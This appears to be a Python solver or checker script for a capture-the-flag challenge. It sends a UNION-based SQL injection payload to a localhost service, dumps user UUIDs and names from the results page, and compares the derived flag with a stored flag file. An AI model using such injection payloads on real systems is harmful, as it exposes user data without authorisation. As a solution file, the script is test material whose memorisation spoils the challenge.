import requests
from bs4 import BeautifulSoup
import re

TARGET_URL = "http://localhost:31555"


def main():
    params = {
        'q': '\' UNION SELECT 1, name, id FROM users -- '
    }
    res = requests.get(TARGET_URL, params=params)
    assert res.status_code == 200

    # extract uuid list with regexp
    # 01844b23-9713-744b-8e1f-f1fddf844193
    uuid_list = re.findall("\">(.+-.+-.+-.+-.+)</", res.text)
    uuid_list.sort()

    # check if all data are gathered
    assert len(uuid_list) == 128

    # get target information
    # NOTE: 0-indexed
    target_uuid = uuid_list[99]
    # print(target_uuid)

    soup = BeautifulSoup(res.text, "html.parser")
    elem = soup.find(text=target_uuid)
    # <div class = "card" >                             # 4. elem.parent.parent.parent
    #     <h5 class = "card-header" >                   # 5. elem.parent.parent.parent.contents[1]
    #       Satomi_Kato                                       # 6. elem.parent.parent.parent.contents[1].text
    #     < /h5 >
    #     <div class = "card-body" >                    # 3. elem.parent.parent
    #         <p class = "card-text" >                  # 2. elem.parent
    #             018455f4-aa1e-771e-8eae-f342965a4ed1  # 1. elem
    #         < /p >
    #     </div >
    # </div >
    flag = f"taskctf{{{elem.parent.parent.parent.contents[1].text}}}"

    with open('../flag.txt') as f:
        want = f.readline()

    if flag != want:
        print(f"want: {want}, got: {flag}")
    else:
        print(f"OK, {flag}")



if __name__ == "__main__":
    main()
